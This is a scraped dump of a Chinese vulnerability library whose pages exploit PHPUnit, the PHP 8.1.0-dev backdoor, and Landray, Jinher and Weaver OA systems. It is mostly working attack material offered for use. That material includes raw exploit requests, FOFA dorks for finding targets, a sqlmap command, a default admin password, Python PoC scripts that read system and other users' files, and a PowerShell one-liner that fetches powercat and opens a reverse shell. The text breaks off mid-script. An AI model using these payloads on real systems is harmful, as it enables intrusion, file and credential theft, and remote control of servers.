远程命令执行漏洞 CVE-2017-9841 漏洞描述 PHPUnit5.6.3之前的版本，存在一处远程代码执行漏洞，利用漏洞可以获取服务器敏感信息及权限。 漏洞影响 [!NOTE] PHPUnit 漏洞复现 漏洞位于 /phpunit/src/Util/PHP/eval-stdin.php 其中关键代码为: eval('?>'.file_get_contents('php://input')); 发送如下请求包执行PHP代码 POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1 Host: Content-Length: 21 Accept-Encoding: gzip 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/开发语言漏洞/":{"url":"book/开发语言漏洞/","title":"开发语言漏洞","keywords":"","body":"开发语言漏洞🐭 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/开发语言漏洞/PHP/":{"url":"book/开发语言漏洞/PHP/","title":"PHP","keywords":"","body":"PHP PHP zerodium后门漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/开发语言漏洞/PHP/PHP zerodium后门漏洞.html":{"url":"book/开发语言漏洞/PHP/PHP zerodium后门漏洞.html","title":"PHP zerodium后门漏洞","keywords":"","body":"PHP zerodium后门漏洞 漏洞描述 PHP开发工程师Jake Birchall在对其中一个恶意COMMIT的分析过程中发现，在代码中注入的后门是来自一个PHP代码被劫持的网站上，并且采用了远程代码执行的操作，并且攻击者盗用了PHP开发人员的名义来提交此COMMIT。 目前为止PHP官方并未就该事件进行更多披露，表示此次服务器被黑的具体细节仍在调查当中。由于此事件的影响，PHP的官方代码库已经被维护人员迁移至GitHub平台，之后的相关代码更新、修改将会都在GitHub上进行。 漏洞影响 [!NOTE] PHP 8.1.0-dev FOFA [!NOTE] \"PHP/8.1.0-dev\" 漏洞复现 后门为添加请求头 User-Agentt: zerodiumsystem('id'); [!NOTE] 是 User-Agentt 不是 User-Agent 反弹shell 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/":{"url":"book/OA产品漏洞/","title":"OA产品漏洞","keywords":"","body":"OA产品漏洞🐶 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/蓝凌OA/":{"url":"book/OA产品漏洞/蓝凌OA/","title":"蓝凌OA","keywords":"","body":"蓝凌OA 蓝凌OA EKP 后台SQL注入漏洞 CNVD-2021-01363 蓝凌OA 任意文件写入漏洞 蓝凌OA custom.jsp 任意文件读取漏洞 蓝凌OA SSRF+JNDI远程命令执行 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/蓝凌OA/蓝凌OA EKP 后台SQL注入漏洞 CNVD-2021-01363.html":{"url":"book/OA产品漏洞/蓝凌OA/蓝凌OA EKP 后台SQL注入漏洞 CNVD-2021-01363.html","title":"蓝凌OA EKP 后台SQL注入漏洞 CNVD-2021-01363","keywords":"","body":"蓝凌OA EKP 后台SQL注入漏洞 CNVD-2021-01363 漏洞描述 深圳市蓝凌软件股份有限公司数字OA(EKP)存在SQL注入漏洞。攻击者可利用漏洞获取数据库敏感信息。 漏洞影响 [!NOTE] 测试时间 2021-3-24 前版本 漏洞复现 存在SQL注入的 Url为,这里拿官方的演示站点演示漏洞过程 https://xxx.xxx.xxx.xxx/km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=1&ordertype=down&s_ajax=true 其中存在SQL注入的参数为 ordeby ， 数据包如下 GET /km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=1&ordertype=down&s_ajax=true HTTP/1.1 Host: xxx.xxx.xxx.xxx Connection: close Pragma: no-cache Cache-Control: no-cache sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: cross-site Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: UM_distinctid=1785f7392888e1-02ece8c7e9a996-5771031-1fa400-1785f73928943d; landray_danyuan=null; landray_guanjianci=null; landray_sorce=baidupinzhuanwy; landray_jihua=null; JSESSIONID=232B6933CF33B5422F9D2649739D48FE; Hm_lvt_223eecc93377a093d4111a2d7ea28f51=1616509114,1616566341,1616566350; Hm_lpvt_223eecc93377a093d4111a2d7ea28f51=1616566350; Hm_lvt_d14cb406f01f8101884d7cf81981d8bb=1616509114,1616566341,1616566350; Hm_lpvt_d14cb406f01f8101884d7cf81981d8bb=1616566507; Hm_lvt_95f4f43e7aa1fe68a51c44ae4eed925d=1616509872,1616509969,1616509973,1616566507; Hm_lpvt_95f4f43e7aa1fe68a51c44ae4eed925d=1616566507; Hm_lvt_22f1fea4412727d23e6a998a4b46f2ab=1616509872,1616509969,1616509973,1616566507; Hm_lpvt_22f1fea4412727d23e6a998a4b46f2ab=1616566507; fd_name=%E5%95%8A%E7%9A%84%E5%93%88; fd_id=1785f817dd0f5a4beaa482646cb9a2d8; nc_phone=15572002383; j_lang=zh-CN; LtpaToken=AAECAzYwNUFEOEZBNjA1QjgxQkFsdW9stJ5e1pcW1hgQi3cOa0iEyAhdZZs=; Hm_lvt_95cec2a2f107db33ad817ed8e4a3073b=1616510026,1616566523; Hm_lpvt_95cec2a2f107db33ad817ed8e4a3073b=1616566523; add_customer=0 保存为文件，使用 Sqlmap 跑一下注入 sqlmap -r sql.txt -p orderby --dbs 感谢名单 感谢 @Miaòa 师傅的投稿 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/蓝凌OA/蓝凌OA 任意文件写入漏洞.html":{"url":"book/OA产品漏洞/蓝凌OA/蓝凌OA 任意文件写入漏洞.html","title":"蓝凌OA 任意文件写入漏洞","keywords":"","body":"蓝凌OA 任意文件写入漏洞 漏洞描述 蓝凌OA 存在任意文件写入漏洞，攻击者可以上传恶意文件 漏洞影响 [!NOTE] 蓝凌OA 漏洞复现 /sys/search/sys_search_main/sysSearchMain.do?method=editParam&fdParemNames=11&FdParameters=[shellcode] 漏洞在/sys/search/sys_search_main/sysSearchMain.do method 为 editrParam。参数为 FdParameters，在 com.landray.kmss.sys.search.jar 中的 com.landray.kmss.sys.search.actions.SysSearchMainAction 类。method 为 editrParam。 对 fdParemNames 的内容进行了判空。如果不为空,进入 SysSearchDictUtil.getParamConditionEntry 方法。 也是对 fdParemNames 进行了一次判空。然后传入 ObjectXML.objectXMLDecoderByString 方法。 将传入进来的 string 字符进行替换。将其载入字节数组缓冲区，在传递给 objectXmlDecoder。 在 objectXmlDecoder 中。就更明显了。典型的 xmlDecoder 反序列化。 整体流程只对 FdParameters 的内容进行了一些内容替换。 导致 xmlDecoder 反序列化漏洞。 利用方式： Xmldecoder payload 生成 https://github.com/mhaskar/XMLDecoder-payload-gene... 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/蓝凌OA/蓝凌OA custom.jsp 任意文件读取漏洞.html":{"url":"book/OA产品漏洞/蓝凌OA/蓝凌OA custom.jsp 任意文件读取漏洞.html","title":"蓝凌OA custom.jsp 任意文件读取漏洞","keywords":"","body":"蓝凌OA custom.jsp 任意文件读取漏洞 漏洞描述 深圳市蓝凌软件股份有限公司数字OA(EKP)存在任意文件读取漏洞。攻击者可利用漏洞获取敏感信息。 漏洞影响 [!NOTE] 蓝凌OA FOFA [!NOTE] app=\"Landray-OA系统\" 漏洞复现 出现漏洞的文件为 custom.jsp '> 请求包为 POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Length: 42 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip var={\"body\":{\"file\":\"file:///etc/passwd\"}} 漏洞POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 蓝凌OA 任意文件读取 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/sys/ui/extend/varkind/custom.jsp\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'var={\"body\":{\"file\":\"file:///etc/passwd\"}}' try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] 正在请求 {}/sys/ui/extend/varkind/custom.jsp \\033[0m\".format(target_url)) if \"root:\" in response.text and response.status_code == 200: print(\"\\033[36m[o] 成功读取 /etc/passwd \\n[o] 响应为:{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) # if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/蓝凌OA/蓝凌OA SSRF+JNDI远程命令执行.html":{"url":"book/OA产品漏洞/蓝凌OA/蓝凌OA SSRF+JNDI远程命令执行.html","title":"蓝凌OA SSRF+JNDI远程命令执行","keywords":"","body":"蓝凌OA SSRF+JNDI远程命令执行 漏洞描述 深圳市蓝凌软件股份有限公司数字OA(EKP)存在任意文件读取漏洞。攻击者可利用漏洞获取敏感信息，读取配置文件得到密钥后访问 admin.do 即可利用 JNDI远程命令执行获取权限 漏洞影响 [!NOTE] 蓝凌OA FOFA [!NOTE] app=\"Landray-OA系统\" 漏洞复现 利用 蓝凌OA custom.jsp 任意文件读取漏洞 读取配置文件 /WEB-INF/KmssConfig/admin.properties 发送请求包 POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1 Host: User-Agent: Go-http-client/1.1 Content-Length: 60 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip var={\"body\":{\"file\":\"/WEB-INF/KmssConfig/admin.properties\"}} 获取password后，使用 DES方法 解密，默认密钥为 kmssAdminKey 访问后台地址使用解密的密码登录 http://xxx.xxx.xxx.xxx/admin.do 使用工具执行命令 https://github.com/welk1n/JNDI-Injection-Exploit java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address] 运行工具监听端口 ping dnslog测试 命令执行 (蓝凌OA 默认使用的是 JDK 1.7) POST /admin.do HTTP/1.1 Host: Cookie: JSESSIONID=90EA764774514A566C480E9726BB3D3F; Hm_lvt_9838edd365000f753ebfdc508bf832d3=1620456866; Hm_lpvt_9838edd365000f753ebfdc508bf832d3=1620459967 Content-Length: 70 Cache-Control: max-age=0 Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\" Sec-Ch-Ua-Mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Origin: Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 method=testDbConn&datasource=rmi://xxx.xxx.xxx.xxx:1099/cbdsdg 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/金和OA/":{"url":"book/OA产品漏洞/金和OA/","title":"金和OA","keywords":"","body":"金和OA C6 管理员默认口令 金和OA C6 管理员默认口令 金和OA C6 download.jsp 任意文件读取漏洞 金和OA C6 后台越权敏感文件遍历漏洞 金和OA C6 后台越权敏感文件遍历漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/金和OA/金和OA C6 管理员默认口令.html":{"url":"book/OA产品漏洞/金和OA/金和OA C6 管理员默认口令.html","title":"金和OA C6 管理员默认口令","keywords":"","body":"金和OA C6 管理员默认口令 漏洞描述 金和OA C6 存在管理员默认账户口令 admin/000000 ，攻击者将以管理员身份登陆后台 漏洞影响 [!NOTE] 金和OA FOFA [!NOTE] app=\"Jinher-OA\" 漏洞复现 账号密码 admin/000000 登录后台 Goby & POC [!NOTE] 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 JingHe_OA_C6_Default_password 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/金和OA/金和OA C6 后台越权信息泄露漏洞.html":{"url":"book/OA产品漏洞/金和OA/金和OA C6 后台越权信息泄露漏洞.html","title":"金和OA C6 后台越权信息泄露漏洞","keywords":"","body":"金和OA C6 越权信息泄露漏洞 漏洞描述 金和OA C6 存在越权信息泄露漏洞，普通用户登录后可以通过遍历ID编号获取管理员及其他用户的敏感信息 漏洞影响 [!NOTE] 金和OA C6 FOFA [!NOTE] app=\"Jinher-OA\" 漏洞复现 使用普通用户登录 OA应用后台 访问的POC为 http://xxx.xxx.xxx.xxx/C6/JHSoft.Web.Dossier/DossierBaseInfoView.aspx?CollID=1&UserID=RY120330 [!NOTE] 注意 RY120330 需要为确定的其他的用户编号 泄露了部分的敏感信息 参考文章 https://mp.weixin.qq.com/s/gwHQVIZeMWfT8a5lBX_4WA 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/金和OA/金和OA C6 后台越权敏感文件遍历漏洞.html":{"url":"book/OA产品漏洞/金和OA/金和OA C6 后台越权敏感文件遍历漏洞.html","title":"金和OA C6 后台越权敏感文件遍历漏洞","keywords":"","body":"金和OA C6 后台越权敏感文件遍历漏洞 漏洞描述 金和OA C6 存在后台越权敏感文件遍历漏洞，普通用户通过遍历特殊参数可以获取其他用户上传的敏感文件 漏洞影响 [!NOTE] 金和OA C6 FOFA [!NOTE] app=\"Jinher-OA\" 漏洞复现 登录后点击信息交流，发起协同页面 上传附件并上传发送给目标 [!NOTE] 这里登录权限为管理员，我们自己发给自己就好，前文只是展现漏洞挖掘思路过程 成功收到上传的附件 点击查看时抓包，发现一个带有文件ID的请求包 返回了几个参数 var strFilePath = '../Resource/slaves/1/8b473ecb-7b39-4384-ada2-b0ec72c4f6ed.png'; var strFileType = 'png'; var strSid='3jvpvhs410m2wdbbficax5q5'; var strFileIDCode='us9w7xWE7do='; var strId = '1229'; var strTxtReg = 'txt,ini,xml,config,htm,html,js,css,asp,aspx,jsp,cs,sql,inf,htc,log'; var strImgReg = 'jpg,gif,jpeg,png,ico'; var MD = ''; 其中我们注意到 strFilePath 为文件的存储地址，我们更改 id参数为另一个值，且测试后发现 name文件名参数无关紧要 更改ID后发送请求包发现获得另一个文件的信息 访问Url，注意 type参数 需要为正确的文件后缀才可以访问 http://xxx.xxx.xxx.xxx/C6/control/OpenFile.aspx?id=1200&name=&type=pdf 这里更换一个普通用户测试是否可行，尝试遍历 id 存在 strFilePath参数 则是存在文件，为空则是文件已经不存在 同时抓包下载文件页面也可以看到可获取的参数 FileID 与 FileIDCode 于是只需要通过刚刚的ID遍历，获取两个关键参数就能下载其他人发送的敏感文件，且只需要普通用户权限 漏洞利用POC [!NOTE] POC只检测是否存在漏洞，且漏洞存在于后台需要登录 运行后访问链接即可下载文件 import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 金和OA C6 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url, file_id, cookie): vuln_url = target_url + \"/C6/control/OpenFile.aspx?id={}&name=&type=pdf\".format(file_id) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\":cookie } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 Url: {}\\033[0m\".format(vuln_url)) if \"strFilePath =\" in response.text and response.status_code == 200: strFilePath = re.findall(r\"var strFilePath = '(.*?)';\", response.text)[0] strFileType = strFilePath[-3:] strFileIDCode = re.findall(r\"var strFileIDCode='(.*?)';\", response.text)[0] strId = re.findall(r\"var strId = '(.*?)';\", response.text)[0] sid = re.findall(r'ASP.NET_SessionId=(.*?);', cookie)[0] if strFilePath != \"\": print(\"\\033[36m[o] 目标 {} 存在漏洞, 获取文件信息:\\n[o] 文件路径：{}\\n[o] 文件类型：{}\\n[o] 文件ID code：{}\\n[o] 文件编号： {}\\033[0m\".format(target_url, strFilePath, strFileType,strFileIDCode, strId )) print(\"\\033[32m[o] 文件下载链接为: {}/C6/JHSoft.Web.CustomQuery/uploadFileDownLoad.aspx?Decrypt=&FileID={}&FileIDCode={}&sid={}\".format(target_url, strId, strFileIDCode, sid)) else: print(\"\\033[31m[x] 目标 {} 文件不存在 \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] 目标 {} 不存在漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) file_id = str(input(\"\\033[35mFile_id >>> \\033[0m\")) cookie = str(input(\"\\033[35mCookie >>> \\033[0m\")) POC_1(target_url, file_id, cookie) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/金和OA/金和OA C6 download.jsp 任意文件读取漏洞.html":{"url":"book/OA产品漏洞/金和OA/金和OA C6 download.jsp 任意文件读取漏洞.html","title":"金和OA C6 download.jsp 任意文件读取漏洞","keywords":"","body":"金和OA C6 download.jsp 任意文件读取漏洞 漏洞描述 金和OA C6 download.jsp文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感信息 漏洞影响 [!NOTE] 金和OA FOFA [!NOTE] app=\"Jinher-OA\" 漏洞复现 登录页面如下 漏洞文件为 download.asp \"\" Then '******************************下载文件存放的服务端目录 url=server.MapPath(Dname) 'url=server.MapPath(\"./\")&\"\\Jhsoft.Web.module\\testbill\\dj\"&Dname '这边做了一下改动By Fanshui '*************************************************** End If 'Response.write url 'response.end Set fso=Server.CreateObject(\"Scripting.FileSystemObject\") Set fl=fso.getfile(url) flsize=fl.size flName=fl.name Set fl=Nothing Set fso=Nothing 'Response.write flName 'Response.write flsize %> 请求的POC为 /C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config 读取 web.config /C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/泛微OA/":{"url":"book/OA产品漏洞/泛微OA/","title":"泛微OA","keywords":"","body":"泛微OA 泛微OA weaver.common.Ctrl 任意文件上传漏洞 泛微云桥 e-Bridge 任意文件读取 泛微OA Bsh 远程代码执行漏洞 CNVD-2019-32204 泛微OA e-cology 数据库配置信息泄漏漏洞 泛微OA WorkflowCenterTreeData接口SQL注入(仅限oracle数据库) CNVD-2019-34241 泛微OA sysinterface/codeEdit.jsp 页面任意文件上传 WooYun-2015-0155705 泛微OA V9 任意文件上传 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/泛微OA/泛微云桥 e-Bridge 任意文件读取.html":{"url":"book/OA产品漏洞/泛微OA/泛微云桥 e-Bridge 任意文件读取.html","title":"泛微云桥 e-Bridge 任意文件读取","keywords":"","body":"泛微云桥 e-Bridge 任意文件读取 漏洞描述 泛微云桥（e-Bridge）是上海泛微公司在”互联网+”的背景下研发的一款用于桥接互联网开放资源与企业信息化系统的系统集成中间件。泛微云桥存在任意文件读取漏洞，攻击者成功利用该漏洞，可实现任意文件读取，获取敏感信息。 影响版本 [!NOTE] 泛微云桥 e-Bridge 2018-2019 多个版本 FOFA [!NOTE] title=\"泛微云桥e-Bridge\" 漏洞复现 [!NOTE] 分为两种，分别为 Windows 和 Linux Windows 访问 http://xxx.xxx.xxx.xxx/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt 成功返回 id值,说明含有此漏洞 调用查看文件接口访问 http://xxx.xxx.xxx.xxx/file/fileNoLogin/id值 Linux 访问 http://xxx.xxx.xxx.xxx/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt 成功返回 id值,说明含有此漏洞 调用查看文件接口访问 http://xxx.xxx.xxx.xxx/file/fileNoLogin/id值 漏洞利用POC [!NOTE] 注意读取Linux系统文件时，需要完整路径 例如读取根目录下的 1.txt 应为 /1.txt 而不是 1.txt #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 泛微云桥 e-Bridge \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') # 判断操作系统 or 判断漏洞是否可利用 def POC_1(target_url): vuln_url_1 = target_url + \"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt\" vuln_url_2 = target_url + \"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt\" vuln_url_3 = target_url + \"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///&fileExt=txt\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } try: response_1 = requests.get(url=vuln_url_1, headers=headers, verify=False, timeout=10) response_2 = requests.get(url=vuln_url_2, headers=headers, verify=False, timeout=10) response_3 = requests.get(url=vuln_url_3, headers=headers, verify=False, timeout=10) if \"无法验证您的身份\" in response_1.text and \"无法验证您的身份\" in response_2.text: print(\"\\033[31m[x] 漏洞已修复，不存在漏洞 \\033[0m\") sys.exit(0) else: if \"No such file or directory\" in response_1.text: print(\"\\033[32m[o] 目标为 Linux 系统\\033[0m\") id = re.findall(r'\"id\":\"(.*?)\"', response_3.text)[0] print(\"\\033[32m[o] 成功获取id：{}\\033[0m\".format(id)) return id,\"linux\" elif \"系统找不到指定的路径\" in response_2.text: print(\"\\033[32m[o] 目标为 Windows 系统\\033[0m\") id = re.findall(r'\"id\":\"(.*?)\"', response_1.text)[0] print(\"\\033[32m[o] 成功获取id：{}\\033[0m\".format(id)) return id,\"windows\" else: print(\"\\033[31m[x] 无法获取目标系统\\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) # 验证漏洞 def POC_2(target_url, id): file_url = target_url + \"/file/fileNoLogin/{}\".format(id) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } try: response = requests.get(url=file_url, headers=headers, verify=False, timeout=10) response.encoding = 'GBK' print(\"\\033[32m[o] 成功读取：\\n\\033[0m{}\".format(response.text)) except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) # windows 文件读取 def POC_3(target_url, File): file_url = target_url + \"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/{}&fileExt=txt\".format(File) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } try: response = requests.get(url=file_url, headers=headers, verify=False, timeout=10) id = re.findall(r'\"id\":\"(.*?)\"', response.text)[0] print(\"\\033[32m[o] 成功获取id：{}\\033[0m\".format(id)) POC_2(target_url, id) except : print(\"\\033[31m[x] 请求失败，无法读取文件 \\033[0m)\") # linux读取文件 def POC_4(target_url, File): file_url = target_url + \"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file://{}&fileExt=txt\".format(File) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } try: response = requests.get(url=file_url, headers=headers, verify=False, timeout=10) id = re.findall(r'\"id\":\"(.*?)\"', response.text)[0] print(\"\\033[32m[o] 成功获取id：{}\\033[0m\".format(id)) POC_2(target_url, id) except: print(\"\\033[31m[x] 请求失败，无法读取文件 \\033[0m)\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) id,system = POC_1(target_url) POC_2(target_url, id) while True: if system == \"windows\": File = input(\"\\033[35mFile >>> \\033[0m\") if File == \"exit\": sys.exit(0) else: POC_3(target_url, File) if system == \"linux\": File = input(\"\\033[35mFile >>> \\033[0m\") if File == \"exit\": sys.exit(0) else: POC_4(target_url, File) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/泛微OA/泛微OA Bsh 远程代码执行漏洞 CNVD-2019-32204.html":{"url":"book/OA产品漏洞/泛微OA/泛微OA Bsh 远程代码执行漏洞 CNVD-2019-32204.html","title":"泛微OA Bsh 远程代码执行漏洞 CNVD-2019-32204","keywords":"","body":"泛微OA Bsh 远程代码执行漏洞 CNVD-2019-32204 漏洞描述 2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁, 泛微e-cology OA系统的Java Beanshell接口可被未授权访问, 攻击者调用该Beanshell接口, 可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行, 漏洞等级严重. FOFA [!NOTE] app=“泛微-协同办公OA” 影响版本 [!NOTE] E-cology 7.0 E-cology 8.0 E-cology 8.1 E-cology 9.0 漏洞复现 直接在网站根目录后加入组件访问路径 /weaver/bsh.servlet.BshServlet/，如下图在victim上执行了命令“whoami” 请求包为 POST /weaver/bsh.servlet.BshServlet HTTP/1.1 Host: xxxxxxxx:8088 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Length: 98 Content-Type: application/x-www-form-urlencoded bsh.script=ex\\u0065c(\"cmd /c dir\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw 关于绕过 eval%00(\"ex\"%2b\"ec(\\\"whoami\\\")\"); ex\\u0065c(\"cmd /c dir\"); IEX(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c ip -p 6666 -e cmd 漏洞POC https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204 #/usr/bin/python #coding:utf-8 #Author:Ja0k #For Weaver-Ecology-OA_RCE import urllib3 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) import requests,sys headers = { 'Content-Type': 'text/xml; charset=utf-8', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0', 'Cache-Control': 'max-age=0', 'Content-Type': 'application/x-www-form-urlencoded', 'Upgrade-Insecure-Requests': '1', 'Content-Length': '578' } proxies= {'http':'http://127.0.0.1:8080'} def Poc_check(target): Url_Payload1=\"/bsh.servlet.BshServlet\" Url_Payload2=\"/weaver/bsh.servlet.BshServlet\" 